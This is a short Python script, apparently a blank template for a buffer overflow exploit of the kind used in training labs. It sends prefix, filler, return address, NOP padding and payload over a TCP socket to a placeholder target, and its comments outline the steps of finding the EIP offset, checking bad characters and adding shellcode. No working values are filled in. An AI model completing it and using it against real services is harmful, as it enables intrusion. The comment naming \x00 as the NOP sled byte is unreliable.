#!/usr/bin/python3

import socket

ip = "ip goes here"
port = 1337

offset = 0 # number of bytes to EIP register
buff = "A" * offset
padding = "" # for nop sled (\x00) once ready for exploit 
retn = "" # ESP address we can write exploit to
prefix = "" # Any info application needs before our buffer
payload = "" # Use for pattern offset, badchars, and eventually shell code

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
  try:
    s.connect((ip, port))
    print("Sending evil payload")
    s.send(bytes(prefix + buff + retn + padding + payload + "\r\n", "latin-1"))
    print("Payload sent")
  except:
    print("something went wrong")


